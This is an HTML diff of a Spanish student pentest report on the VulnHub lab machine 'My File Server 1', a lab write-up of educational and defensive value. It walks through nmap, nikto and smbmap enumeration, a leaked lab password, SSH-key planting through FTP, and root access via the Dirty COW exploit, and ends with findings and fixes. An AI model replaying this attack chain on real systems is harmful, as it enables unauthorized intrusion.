@@ -1,292 +1,286 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="es" class="scroll-smooth">
 <head>
     <meta charset="UTF-8">
-    <title>ACTIVIDAD 13 - Red Team Report: Pentesting de My File Server 1</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Actividad 13: Red Team Report | Portafolio Académico</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        body { font-family: Arial, sans-serif; line-height: 1.6; margin: 40px; color: #333; }
-        h1, h2, h3 { color: #0056b3; }
-        table { width: 100%; border-collapse: collapse; margin: 20px 0; }
-        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
-        th { background-color: #f2f2f2; }
-        .lab-img { border: 2px solid #0056b3; margin: 15px 0; max-width: 100%; height: auto; display: block; }
-        .lab-caption { font-style: italic; color: #555; margin-bottom: 20px; }
+        body { 
+            font-family: 'Plus Jakarta Sans', sans-serif; 
+            background-color: #ffffff; 
+            color: #1f2937; 
+        }
+        .main-card {
+            background: linear-gradient(135deg, rgba(239, 246, 255, 0.6) 0%, rgba(254, 243, 199, 0.3) 50%, rgba(253, 232, 232, 0.4) 100%);
+            border-radius: 2rem;
+            border: 1px solid rgba(229, 231, 235, 0.8);
+            box-shadow: 0 10px 30px -5px rgba(0, 0, 0, 0.02);
+        }
+        .content-card {
+            background: #ffffff;
+            border-radius: 1rem;
+            border: 1px solid #e5e7eb;
+            transition: all 0.3s ease;
+        }
+        .content-card:hover {
+            border-color: #3b82f6;
+            box-shadow: 0 10px 20px -5px rgba(59, 130, 246, 0.05);
+        }
+        table { width: 100%; border-collapse: collapse; margin: 1.5rem 0; font-size: 0.875rem; }
+        th, td { border: 1px solid #e5e7eb; padding: 0.75rem; text-align: left; }
+        th { background-color: #f9fafb; font-weight: 600; color: #374151; }
+        code { background-color: #f3f4f6; padding: 0.2rem 0.4rem; border-radius: 0.25rem; font-family: monospace; font-size: 0.875rem; color: #dc2626; }
     </style>
 </head>
-<body>
+<body class="selection:bg-blue-600 selection:text-white">
 
-<h1>ACTIVIDAD 13</h1>
-<h2>Red Team Report: Pentesting de My File Server 1</h2>
-<p><strong>CNO IV: Seguridad Informática</strong></p>
-<p>FABIOLA CALVILLO GALVÁN (182455)<br>
-MTRO. SERVANDO LÓPEZ CONTRERAS<br>
-OTOÑO 2026</p>
+    <!-- BARRA SUPERIOR ROJA -->
+    <div class="bg-red-600 text-white text-center py-2 text-xs font-semibold tracking-wider uppercase">
+        🚀 PORTAFOLIO ACADÉMICO OFICIAL – CICLO OTOÑO 2026
+    </div>
 
-<hr>
+    <!-- MENÚ DE NAVEGACIÓN -->
+    <nav class="bg-white border-b border-gray-100 sticky top-0 z-50 px-6 py-4">
+        <div class="container mx-auto flex justify-between items-center max-w-7xl">
+            <div class="flex items-center gap-4">
+                <a href="parcial2.html" class="flex items-center gap-2 text-xs font-bold tracking-tight text-gray-900 uppercase hover:text-blue-600 transition">
+                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path></svg>
+                    Volver a Parcial 2
+                </a>
+            </div>
+            <div class="hidden md:flex space-x-7 text-xs font-semibold tracking-wider text-gray-600 uppercase">
+                <a href="index.html" class="hover:text-blue-600 transition">Inicio</a>
+                <a href="parcial1.html" class="hover:text-blue-600 transition">Parcial 1</a>
+                <a href="parcial2.html" class="text-blue-600 font-bold transition">Parcial 2</a>
+                <a href="parcial3.html" class="hover:text-blue-600 transition">Parcial 3</a>
+                <a href="roadtohalloffame.html" class="hover:text-blue-600 transition">Road to Hall of Fame</a>
+                <a href="proyectos.html" class="hover:text-blue-600 transition">Proyectos</a>
+            </div>
+        </div>
+    </nav>
 
-<h2>1. Executive Summary (Resumen Ejecutivo)</h2>
-<p>La evaluación metodológica de la seguridad informática permite identificar, de manera anticipada, las debilidades y los vectores de ataque presentes en un sistema, antes de que estos puedan ser aprovechados por un actor con intenciones maliciosas. En este sentido, las pruebas de penetración constituyen una metodología ampliamente utilizada para analizar la postura de seguridad de un sistema, pues simulan escenarios reales de ataque con el propósito de detectar debilidades, evaluar su impacto potencial y proponer medidas de mitigación.</p>
-<p>En relación con lo anterior, el presente proyecto tiene como objetivo desarrollar un informe técnico de pruebas de penetración (Pentesting Report) sobre la máquina vulnerable My File Server - 1, aplicando una metodología estructurada de evaluación de seguridad. Dicha actividad se llevó a cabo utilizando una máquina virtual con sistema operativo Kali Linux como entorno de ataque, y el host 192.168.56.103 (FILESERVER) como el sistema objetivo. El análisis incluyó la definición del alcance de la prueba, la aplicación de una metodología de pruebas de penetración y el desarrollo de las etapas de la misma, entre ellas las fases de reconocimiento, enumeración, explotación y escalada de privilegios, con el objetivo de identificar y explotar las vulnerabilidades encontradas en el sistema.</p>
-<p>Como resultado de la evaluación, se documentaron hallazgos relevantes acompañados de evidencias técnicas, un análisis de impacto basado en el modelo de seguridad C.I.A. (Confidencialidad, Integridad y Disponibilidad), así como una tabla de hallazgos que resume los elementos identificados. De igual forma, el informe añade recomendaciones técnicas enfocadas a la prevención y mitigación de las debilidades detectadas y al robustecimiento de la seguridad del sistema evaluado. En conjunto, la cadena de explotación documentada permitió escalar desde un acceso anónimo a los servicios de red hasta el control total del sistema (usuario root), por lo que el nivel de riesgo global del activo se considera CRÍTICO.</p>
+    <!-- ENCABEZADO TIPO HERO -->
+    <header class="container mx-auto px-6 py-10 max-w-5xl">
+        <div class="main-card p-8 md:p-12 flex flex-col md:flex-row justify-between items-start md:items-center gap-6">
+            <div class="space-y-3 max-w-2xl">
+                <span class="inline-block px-3 py-1 bg-red-600 text-white text-[11px] font-bold uppercase tracking-wider rounded-full shadow-sm">
+                    Actividad 13 – CNO IV Seguridad Informática
+                </span>
+                <h1 class="text-2xl sm:text-4xl font-extrabold text-gray-900 tracking-tight">
+                    Red Team Report: Pentesting de My File Server 1
+                </h1>
+                <p class="text-gray-600 text-xs md:text-sm font-medium">
+                    <strong>Alumna:</strong> Fabiola Calvillo Galván (182455) | <strong>Profesor:</strong> Mtro. Servando López Contreras | Otoño 2026
+                </p>
+            </div>
 
-<h3>Resumen de hallazgos por severidad</h3>
-<table>
-    <tr><th>Severidad</th><th>N.º de hallazgos</th></tr>
-    <tr><td>Crítica</td><td>1</td></tr>
-    <tr><td>Alta</td><td>3</td></tr>
-    <tr><td>Media</td><td>3</td></tr>
-    <tr><td>Baja</td><td>0</td></tr>
-</table>
+            <!-- Botones de Descarga de PDFs -->
+            <div class="flex flex-col gap-3 w-full md:w-auto flex-shrink-0">
+                <a href="Act13.pdf" target="_blank" class="inline-flex items-center justify-center gap-2 bg-blue-600 hover:bg-blue-700 text-white font-bold text-xs tracking-wider uppercase px-5 py-3 rounded-xl transition duration-300 shadow-sm whitespace-nowrap">
+                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 10v6m0 0l-3-3m3 3l3-3m2 8H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path></svg>
+                    Descargar PDF Act 13
+                </a>
+                <a href="Act 14. Ciberseguridad en una mirada.pdf" target="_blank" class="inline-flex items-center justify-center gap-2 bg-gray-900 hover:bg-gray-800 text-white font-bold text-xs tracking-wider uppercase px-5 py-3 rounded-xl transition duration-300 shadow-sm whitespace-nowrap">
+                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 10v6m0 0l-3-3m3 3l3-3m2 8H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path></svg>
+                    Descargar PDF Act 14
+                </a>
+            </div>
+        </div>
+    </header>
 
-<hr>
+    <!-- CONTENIDO DEL REPORTE -->
+    <main class="container mx-auto px-6 pb-20 max-w-5xl space-y-10">
 
-<h2>2. Alcance (Scope)</h2>
-<p>El presente reporte consiste en la ejecución de una prueba de penetración controlada sobre la máquina objetivo My File Server 1 (192.168.56.103), utilizando como equipo atacante la distribución de Linux, Kali. El análisis fue realizado a través de una metodología estructurada; esto, con el objetivo de identificar, explotar y documentar las vulnerabilidades encontradas, medir su impacto según el modelo C.I.A. y proponer recomendaciones para remediar el problema.</p>
-<p><strong>Incluye pruebas y actividades realizadas:</strong></p>
-<ul>
-    <li>Definición y verificación del alcance técnico, identificando los elementos objetivo, como la IP, los servicios en ejecución, etc.</li>
-    <li>Fase de reconocimiento. Enumeración de servicios y recursos.</li>
-    <li>Explotación controlada de las vulnerabilidades identificadas en la máquina objetivo.</li>
-    <li>Escalada de privilegios y documentación de la cadena de explotación. Registro de evidencias y elaboración de una tabla de hallazgos.</li>
-    <li>Análisis de impacto respecto al modelo C.I.A.</li>
-</ul>
-<p><strong>Excluye pruebas no autorizadas y fuera del alcance:</strong></p>
-<ul>
-    <li>Pruebas sobre sistemas distintos a My File Server - 1.</li>
-    <li>Ingeniería social, phishing a usuarios reales o pruebas que incluyan interacción con personal.</li>
-    <li>Pruebas con intenciones destructivas sin autorización. Filtración de datos fuera del entorno de pruebas.</li>
-</ul>
-<p><strong>Restricciones del alcance:</strong></p>
-<ul>
-    <li>Las pruebas se realizaron en un entorno de laboratorio controlado, con la imagen descargada de VulnHub, misma que se asume no representa un sistema productivo.</li>
-    <li>No se intentó explotar vulnerabilidades fuera del propósito de demostrar el vector de ataque.</li>
-    <li>Las herramientas utilizadas son las que incluye de forma predeterminada la distribución Kali Linux, de código abierto y de libre descarga.</li>
-    <li>La configuración de red utilizada no se modificó durante el desarrollo de la prueba de penetración.</li>
-    <li>Las pruebas fueron documentadas en tiempo real, con evidencia reproducible (capturas de pantalla y comandos). Se priorizaron técnicas de explotación sin consecuencias destructivas para el sistema objetivo.</li>
-</ul>
-<p><strong>Entregables:</strong> Informe técnico en formato profesional, tabla de hallazgos con evidencia, y capturas de pantalla del desarrollo metodológico de la prueba de penetración.</p>
-<p><strong>Criterios de éxito:</strong> Identificación y documentación clara de las vulnerabilidades encontradas en la máquina objetivo; evidencia de comandos y herramientas utilizada que sea reproducible y respalde cada hallazgo; propuesta de medidas de mitigación técnicas que prioricen la severidad y el impacto, siguiendo el modelo C.I.A.</p>
+        <!-- 1. Executive Summary -->
+        <section class="content-card p-8 space-y-4">
+            <h2 class="text-xl font-bold text-gray-900 border-b pb-3">1. Executive Summary (Resumen Ejecutivo)</h2>
+            <p class="text-gray-700 text-sm leading-relaxed">
+                La evaluación metodológica de la seguridad informática permite identificar, de manera anticipada, las debilidades y los vectores de ataque presentes en un sistema, antes de que estos puedan ser aprovechados por un actor con intenciones maliciosas. En este sentido, las pruebas de penetración constituyen una metodología ampliamente utilizada para analizar la postura de seguridad de un sistema, pues simulan escenarios reales de ataque con el propósito de detectar debilidades, evaluar su impacto potencial y proponer medidas de mitigación.
+            </p>
+            <p class="text-gray-700 text-sm leading-relaxed">
+                En relación con lo anterior, el presente proyecto tiene como objetivo desarrollar un informe técnico de pruebas de penetración (Pentesting Report) sobre la máquina vulnerable <strong>My File Server - 1</strong>, aplicando una metodología estructurada de evaluación de seguridad. Dicha actividad se llevó a cabo utilizando una máquina virtual con sistema operativo Kali Linux como entorno de ataque, y el host <code>192.168.56.103</code> (FILESERVER) como el sistema objetivo. El análisis incluyó la definición del alcance de la prueba, la aplicación de una metodología de pruebas de penetración y el desarrollo de las etapas de la misma, entre ellas las fases de reconocimiento, enumeración, explotación y escalada de privilegios.
+            </p>
+            <p class="text-gray-700 text-sm leading-relaxed">
+                Como resultado de la evaluación, se documentaron hallazgos relevantes con evidencias técnicas, un análisis de impacto basado en el modelo de seguridad C.I.A. (Confidencialidad, Integridad y Disponibilidad), y recomendaciones técnicas orientadas al robustecimiento de la seguridad. La cadena de explotación documentada permitió escalar desde un acceso anónimo hasta el control total del sistema (usuario root), por lo que el nivel de riesgo global del activo se considera <strong>CRÍTICO</strong>.
+            </p>
+            
+            <h3 class="font-bold text-gray-800 text-sm pt-2">Resumen de hallazgos por severidad</h3>
+            <div class="overflow-x-auto">
+                <table>
+                    <tr><th>Severidad</th><th>N.º de hallazgos</th></tr>
+                    <tr><td><span class="text-red-600 font-bold">Crítica</span></td><td>1</td></tr>
+                    <tr><td><span class="text-orange-600 font-bold">Alta</span></td><td>3</td></tr>
+                    <tr><td><span class="text-yellow-600 font-bold">Media</span></td><td>3</td></tr>
+                    <tr><td>Baja</td><td>0</td></tr>
+                </table>
+            </div>
+        </section>
 
-<hr>
+        <!-- 2. Alcance -->
+        <section class="content-card p-8 space-y-4">
+            <h2 class="text-xl font-bold text-gray-900 border-b pb-3">2. Alcance (Scope)</h2>
+            <p class="text-gray-700 text-sm leading-relaxed">
+                El presente reporte consiste en la ejecución de una prueba de penetración controlada sobre la máquina objetivo <strong>My File Server 1 (192.168.56.103)</strong>, utilizando como equipo atacante Kali Linux.
+            </p>
+            <ul class="list-disc pl-5 text-sm text-gray-700 space-y-2">
+                <li><strong>Incluye:</strong> Definición del alcance técnico, reconocimiento y enumeración de servicios (FTP, SMB, HTTP, NFS), explotación controlada y escalada de privilegios.</li>
+                <li><strong>Excluye:</strong> Pruebas sobre sistemas ajenos a My File Server 1, ingeniería social, phishing a usuarios y ataques destructivos.</li>
+                <li><strong>Restricciones:</strong> Entorno de laboratorio controlado (VulnHub), herramientas de código abierto predeterminadas en Kali Linux.</li>
+            </ul>
+        </section>
 
-<h2>3. Metodología Aplicada</h2>
-<p>El análisis de seguridad llevado a cabo en el presente reporte fue realizado a través de la aplicación de una metodología formal de pruebas de penetración, estructurada en distintas fases que permiten identificar, analizar y explotar vectores de entrada dentro de un sistema de manera controlada. Con este enfoque metodológico se simula el comportamiento de un atacante real, pero dentro de un entorno virtual hermético, con el objetivo de detectar debilidades de seguridad y documentarlas de forma técnica y sistemática.</p>
-<p>Para la ejecución de las pruebas se utilizó la distribución de Linux enfocada a la ciberseguridad, Kali, como plataforma de ataque, mientras que la máquina objetivo evaluada fue My File Server - 1. A lo largo del proceso se siguieron las fases tradicionales de una evaluación de seguridad ofensiva: reconocimiento, enumeración, explotación y escalada de privilegios, cada una enfocada en obtener información relevante y detallada de forma progresiva acerca de la máquina objetivo y sus posibles vulnerabilidades.</p>
-<p>Las herramientas empleadas durante el ejercicio fueron arp-scan, Nmap, Nikto, SMBMap, un cliente FTP, OpenSSH/ssh-keygen, un navegador web, GCC y un exploit público correspondiente a CVE-2016-5195.</p>
+        <!-- 3. Metodología Aplicada -->
+        <section class="content-card p-8 space-y-4">
+            <h2 class="text-xl font-bold text-gray-900 border-b pb-3">3. Metodología Aplicada</h2>
+            <p class="text-gray-700 text-sm leading-relaxed">
+                El análisis se rigió por fases estructuradas de seguridad ofensiva: <strong>Reconocimiento, Enumeración, Explotación y Escalada de Privilegios</strong>. Herramientas empleadas: <code>arp-scan</code>, <code>Nmap</code>, <code>Nikto</code>, <code>SMBMap</code>, cliente FTP, <code>ssh-keygen</code>, <code>gcc</code> y exploit público <code>CVE-2016-5195 (Dirty COW)</code>.
+            </p>
+        </section>
 
-<hr>
+        <!-- 4. Reconocimiento -->
+        <section class="content-card p-8 space-y-4">
+            <h2 class="text-xl font-bold text-gray-900 border-b pb-3">4. Fases de Reconocimiento</h2>
+            <p class="text-gray-700 text-sm leading-relaxed">
+                Se localizó la máquina objetivo en la red local mediante <code>sudo arp-scan -l</code>, identificando la IP <code>192.168.56.103</code>. Posteriormente se realizó un escaneo completo de puertos y servicios con Nmap:
+            </p>
+            <code>nmap -p- 192.168.56.103 -sV</code>
+            
+            <div class="overflow-x-auto mt-4">
+                <table>
+                    <tr><th>Puerto</th><th>Servicio</th><th>Versión</th><th>Observación</th></tr>
+                    <tr><td>21/tcp</td><td>FTP</td><td>vsftpd 3.0.2</td><td>Login anónimo permitido</td></tr>
+                    <tr><td>22/tcp</td><td>SSH</td><td>OpenSSH 7.4</td><td>Protocolo 2.0</td></tr>
+                    <tr><td>80/tcp</td><td>HTTP</td><td>Apache httpd 2.4.6 (CentOS)</td><td>Versión desactualizada</td></tr>
+                    <tr><td>111/tcp</td><td>rpcbind</td><td>2-4 (RPC #100000)</td><td>Expuesto a la red</td></tr>
+                    <tr><td>445/tcp</td><td>SMB</td><td>Samba smbd 3.X-4.X</td><td>Sesión nula permitida</td></tr>
+                    <tr><td>2049/tcp</td><td>NFS</td><td>nfs_acl 3</td><td>Servicio RPC asociado a NFS</td></tr>
+                    <tr><td>2121/tcp</td><td>FTP</td><td>ProFTPD 1.3.5</td><td>Segundo servicio FTP expuesto</td></tr>
+                    <tr><td>20048/tcp</td><td>mountd</td><td>1-3 (RPC #100005)</td><td>Asociado a NFS</td></tr>
+                </table>
+            </div>
+        </section>
 
-<h2>4. Fases de Reconocimiento</h2>
-<p>Durante la fase de reconocimiento se identificaron los equipos activos dentro del segmento de red del laboratorio, con el fin de descubrir la dirección IP asignada a la máquina objetivo, que en este caso corresponde a My File Server - 1.</p>
-<p>Para poder localizar los hosts dentro de la red, se abrió una terminal en Kali Linux y se utilizó la herramienta arp-scan. Esta herramienta envía solicitudes ARP (Address Resolution Protocol) a todos los equipos conectados en la red local, lo cual resulta un método sumamente efectivo y rápido para descubrir dispositivos activos, incluso si estos cuentan con reglas de firewall que bloquean el método de ping.</p>
-<p>Se ejecutó el siguiente comando con privilegios de administrador:</p>
-<p><code>sudo arp-scan -l</code></p>
-<p>Al ejecutar el comando se requirió la contraseña del usuario root. Una vez autenticado, la herramienta inició el escaneo utilizando la interfaz de red etho e inspeccionó los hosts posibles dentro de la subred. El escaneo finalizó exitosamente y devolvió las direcciones IP activas en la red, identificando que la dirección IP de la máquina atacante (Kali Linux) corresponde a 192.168.56.101, mientras que la dirección 192.168.56.103 corresponde al servidor objetivo.</p>
-<p class="lab-caption">LAB6.1: Descubrimiento de host con arp-scan e inicio del escaneo con Nikto.</p>
+        <!-- 5. Enumeración -->
+        <section class="content-card p-8 space-y-4">
+            <h2 class="text-xl font-bold text-gray-900 border-b pb-3">5. Enumeración</h2>
+            <p class="text-gray-700 text-sm leading-relaxed">
+                Mediante el escaneo con <code>Nikto</code> en el puerto 80, se localizó el archivo <code>readme.txt</code> accesible públicamente, el cual revelaba la contraseña en texto plano: <code>rootroot1</code>. Asimismo, el análisis con <code>smbmap</code> confirmó que el recurso compartido <code>smbdata</code> permitía acceso mediante sesión NULL con permisos de lectura y escritura.
+            </p>
+        </section>
 
-<p>El descubrimiento de la dirección IP del servidor fue fundamental para continuar con el análisis y dar paso a la fase de enumeración, a través de la cual se identificaron los puertos y servicios disponibles de la máquina víctima.</p>
-<p>Para ello, se abrió una terminal en Kali Linux y se ejecutó el siguiente comando:</p>
-<p><code>nmap -p- 192.168.56.103 -sV</code></p>
-<p>Se utilizó la herramienta Nmap, diseñada para analizar rápidamente grandes redes. El parámetro -p- permitió escanear todos los puertos (del 1 al 65535), ya que por defecto Nmap solo analiza los 1000 puertos más comunes. A continuación se indicó la dirección IP objetivo encontrada anteriormente, y finalmente el parámetro -sV se utilizó para intentar determinar la versión exacta de los servicios que se ejecutan en los puertos abiertos. Conocer la versión exacta de un servicio es un punto importante para identificar posibles vectores vulnerables, ya que varias vulnerabilidades son específicas de ciertas versiones de software.</p>
-<p class="lab-caption">LAB6.2: Escaneo de puertos completo (nmap -p- -sV) sobre 192.168.56.103.</p>
+        <!-- 6. Explotación -->
+        <section class="content-card p-8 space-y-4">
+            <h2 class="text-xl font-bold text-gray-900 border-b pb-3">6. Explotación</h2>
+            <p class="text-gray-700 text-sm leading-relaxed">
+                Utilizando las credenciales obtenidas (<code>smbuser</code> / <code>rootroot1</code>) y el servicio FTP habilitado, se generó un par de llaves SSH (<code>ssh-keygen</code>) y se cargó la llave pública en el servidor remoto como <code>.ssh/authorized_keys</code>. Esto permitió acceder vía SSH al servidor sin requerir contraseña:
+            </p>
+            <code>ssh smbuser@192.168.56.103</code>
+        </section>
 
-<p>Observando el resultado, se lograron identificar los siguientes servicios:</p>
-<table>
-    <tr><th>Puerto</th><th>Servicio</th><th>Versión</th><th>Observación</th></tr>
-    <tr><td>21/tcp</td><td>FTP</td><td>vsftpd 3.0.2</td><td>Login anónimo permitido</td></tr>
-    <tr><td>22/tcp</td><td>SSH</td><td>OpenSSH 7.4</td><td>Protocolo 2.0</td></tr>
-    <tr><td>80/tcp</td><td>HTTP</td><td>Apache httpd 2.4.6 (CentOS)</td><td>Versión desactualizada</td></tr>
-    <tr><td>111/tcp</td><td>rpcbind</td><td>2-4 (RPC #100000)</td><td>Expuesto a la red</td></tr>
-    <tr><td>445/tcp</td><td>SMB</td><td>Samba smbd 3.X-4.X</td><td>Sesión nula permitida</td></tr>
-    <tr><td>2049/tcp</td><td>NFS</td><td>nfs_acl 3</td><td>Servicio RPC asociado a NFS</td></tr>
-    <tr><td>2121/tcp</td><td>FTP</td><td>ProFTPD 1.3.5</td><td>Segundo servicio FTP expuesto</td></tr>
-    <tr><td>20048/tcp</td><td>mountd</td><td>1-3 (RPC #100005)</td><td>Asociado a NFS</td></tr>
-</table>
+        <!-- 7. Escalada de Privilegios -->
+        <section class="content-card p-8 space-y-4">
+            <h2 class="text-xl font-bold text-gray-900 border-b pb-3">7. Escalada de Privilegios</h2>
+            <p class="text-gray-700 text-sm leading-relaxed">
+                Revisando la versión del kernel con <code>uname -a</code> (<code>Linux fileserver 3.10.0-229.el7.x86_64</code>), se identificó vulnerabilidad a <strong>CVE-2016-5195 (Dirty COW)</strong>. Se descargó el exploit <code>40616.c</code>, se compiló con <code>gcc</code> y se ejecutó, logrando sobrescribir <code>/usr/bin/passwd</code> y obteniendo una consola con privilegios de root (<code>uid=0(root)</code>).
+            </p>
+        </section>
 
-<p>Posterior a verificar la versión de los servicios en los puertos abiertos, se procedió a complementar la identificación de puertos y servicios disponibles de la víctima, mismos que ayudarían a determinar el vector adecuado para ser vulnerado. Para ello, se utilizó el siguiente comando:</p>
-<p><code>nmap -A 192.168.56.103</code></p>
-<p>Se volvió a utilizar la herramienta Nmap, pero en esta ocasión únicamente con el parámetro -A, el cual combina varias técnicas de escaneo (detección de sistema operativo, versiones de servicio, scripts de reconocimiento y traceroute) para proporcionar una visión más completa del objetivo. Este reconocimiento inicial permitió priorizar los servicios FTP, SMB y HTTP como los vectores más prometedores para la fase de enumeración, al presentar configuraciones potencialmente débiles.</p>
-<p class="lab-caption">LAB6.3: Escaneo completo con nmap -A sobre el objetivo.</p>
+        <!-- 8. Análisis de Impacto -->
+        <section class="content-card p-8 space-y-4">
+            <h2 class="text-xl font-bold text-gray-900 border-b pb-3">8. Análisis de Impacto (Modelo C.I.A.)</h2>
+            <ul class="list-disc pl-5 text-sm text-gray-700 space-y-2">
+                <li><strong>Confidencialidad (Crítico):</strong> Divulgación de credenciales en texto plano (<code>readme.txt</code>) y acceso total a archivos del servidor.</li>
+                <li><strong>Integridad (Crítico):</strong> Modificación de archivos del sistema operativo mediante Dirty COW (<code>/usr/bin/passwd</code>) y subida de llaves de persistencia.</li>
+                <li><strong>Disponibilidad (Alto):</strong> Riesgo de inestabilidad del kernel o interrupción de servicios al manipular binarios críticos del sistema.</li>
+            </ul>
+        </section>
 
-<hr>
+        <!-- 9. Recomendaciones -->
+        <section class="content-card p-8 space-y-4">
+            <h2 class="text-xl font-bold text-gray-900 border-b pb-3">9. Recomendaciones Técnicas</h2>
+            <p class="text-gray-700 text-sm leading-relaxed">
+                Eliminar archivos de prueba (<code>readme.txt</code>), deshabilitar acceso anónimo FTP, restringir permisos de escritura en directorios home, forzar la firma de mensajes SMB, deshabilitar sesiones nulas, actualizar Apache httpd y aplicar los parches correspondientes del kernel para corregir CVE-2016-5195 (Dirty COW).
+            </p>
+        </section>
 
-<h2>5. Enumeración</h2>
-<p>La fase de enumeración tuvo como objetivo profundizar en los servicios identificados durante el reconocimiento, con la finalidad de localizar información o configuraciones que permitieran obtener un punto de entrada al sistema.</p>
-<p>Al analizar los puertos abiertos se observó la disponibilidad del servicio Apache sobre el puerto 80. Dado que un servidor web mal configurado puede exponer archivos y directorios sensibles, se utilizó la herramienta NIKTO para enumerar los directorios del servicio web. NIKTO es un escáner de vulnerabilidades para servidores web especializado en el protocolo HTTP/HTTPS, que contrasta el objetivo contra una base de miles de archivos y configuraciones potencialmente peligrosas. Para ello se ejecutó el siguiente comando:</p>
-<p><code>sudo nikto -h 192.168.56.103</code></p>
-<p>Se utilizó el parámetro -h para indicar el host sobre el cual se ejecutaría el análisis.</p>
-<p class="lab-caption">LAB6.4: Resultados del escaneo Nikto sobre el puerto 80.</p>
+        <!-- 10. Tabla de Hallazgos -->
+        <section class="content-card p-8 space-y-4">
+            <h2 class="text-xl font-bold text-gray-900 border-b pb-3">10. Tabla de Hallazgos</h2>
+            <div class="overflow-x-auto">
+                <table>
+                    <tr>
+                        <th>ID</th>
+                        <th>Vulnerabilidad</th>
+                        <th>Severidad</th>
+                        <th>Impacto</th>
+                        <th>Recomendación</th>
+                    </tr>
+                    <tr>
+                        <td>F-01</td>
+                        <td>Divulgación de credenciales en readme.txt</td>
+                        <td><span class="text-orange-600 font-bold">Alta</span></td>
+                        <td>Compromiso inicial de acceso</td>
+                        <td>Eliminar archivos sensibles del webroot</td>
+                    </tr>
+                    <tr>
+                        <td>F-02</td>
+                        <td>FTP anónimo habilitado</td>
+                        <td><span class="text-yellow-600 font-bold">Media</span></td>
+                        <td>Permite enumeración y escritura</td>
+                        <td>Deshabilitar login anónimo</td>
+                    </tr>
+                    <tr>
+                        <td>F-03</td>
+                        <td>Persistencia mediante authorized_keys vía FTP</td>
+                        <td><span class="text-orange-600 font-bold">Alta</span></td>
+                        <td>Acceso SSH persistente sin contraseña</td>
+                        <td>Restringir permisos de escritura en home</td>
+                    </tr>
+                    <tr>
+                        <td>F-04</td>
+                        <td>Sesión nula SMB en smbdata</td>
+                        <td><span class="text-orange-600 font-bold">Alta</span></td>
+                        <td>Lectura y escritura sin autenticación</td>
+                        <td>Deshabilitar sesiones nulas y exigir SMB signing</td>
+                    </tr>
+                    <tr>
+                        <td>F-05</td>
+                        <td>Exposición de servicios NFS/rpcbind</td>
+                        <td><span class="text-yellow-600 font-bold">Media</span></td>
+                        <td>Superficie de ataque ampliada</td>
+                        <td>Restringir acceso por firewall</td>
+                    </tr>
+                    <tr>
+                        <td>F-06</td>
+                        <td>Apache 2.4.6 desactualizado</td>
+                        <td><span class="text-yellow-600 font-bold">Media</span></td>
+                        <td>Vulnerabilidades web conocidas</td>
+                        <td>Actualizar servidor web y cabeceras</td>
+                    </tr>
+                    <tr>
+                        <td>F-07</td>
+                        <td>Escalada Dirty COW (CVE-2016-5195)</td>
+                        <td><span class="text-red-600 font-bold">Crítica</span></td>
+                        <td>Compromiso total del sistema (root)</td>
+                        <td>Actualizar kernel del sistema operativo</td>
+                    </tr>
+                </table>
+            </div>
+        </section>
 
-<p>Luego de analizar el resultado en consola, se observaron varios hallazgos de interés, destacando el archivo de texto "readme.txt", señalado por la propia herramienta como un elemento potencialmente interesante. Valiéndonos de un navegador disponible, en este caso Firefox, se colocó la dirección IP del objetivo seguida de la ruta del archivo encontrado para intentar acceder a él.</p>
-<p class="lab-caption">LAB6.5: Archivo readme.txt accesible públicamente, exponiendo una contraseña en texto plano.</p>
+    </main>
 
-<p>Al acceder a la ruta correcta en el navegador, se observó la información "My Password is rootroot1" desplegada directamente en pantalla. Este hallazgo es, sin duda, el preámbulo de la fase de explotación, ya que proporciona una credencial válida que, combinada con un nombre de usuario correcto, permitiría iniciar sesión en alguno de los servicios autenticados detectados previamente (FTP, SSH o SMB).</p>
-<p>Dado que el escaneo inicial reveló la disponibilidad del servicio SAMBA (smbd), protocolo que permite la comunicación cliente-servidor utilizada para compartir archivos entre equipos de una red, se procedió a enumerar dicho servicio para identificar los recursos compartidos y los usuarios asociados. Para ello se utilizó el siguiente comando:</p>
-<p><code>sudo smbmap -H 192.168.56.103</code></p>
-<p>Con sudo se consiguió ejecutar el comando con privilegios; posteriormente, smbmap es la herramienta utilizada para la enumeración, misma que enlista unidades compartidas, permisos y contenidos de forma rápida. Finalmente, el parámetro -H antecede a la dirección IP del objetivo.</p>
-<p class="lab-caption">LAB6.6: Enumeración SMB con SMBMap: sesión NULL y recurso smbdata con permisos READ/WRITE.</p>
-
-<p>Al analizar el resultado, se observó que SMBMap logró establecer una sesión NULL (es decir, sin necesidad de credenciales) y que el recurso compartido "smbdata" otorga permisos de lectura y escritura (READ, WRITE) a cualquier usuario no autenticado. La presencia del usuario "smbuser" en el listado de recursos también resultó relevante, ya que suele tratarse de un nombre de usuario predeterminado asociado a configuraciones de seguridad débiles.</p>
-<p>Para complementar la enumeración de los servicios SMB y NFS, se revisó el detalle del escaneo con Nmap (-A) ejecutado previamente, confirmando la versión de Samba, el estado del acceso FTP anónimo y la configuración de seguridad de los mensajes SMB.</p>
-<p class="lab-caption">LAB6.7: Detalle de servicios NFS/RPC y configuración de seguridad SMB obtenido con nmap -A.</p>
-<p class="lab-caption">LAB6.8: Detalle adicional de los servicios expuestos obtenido con nmap -A.</p>
-
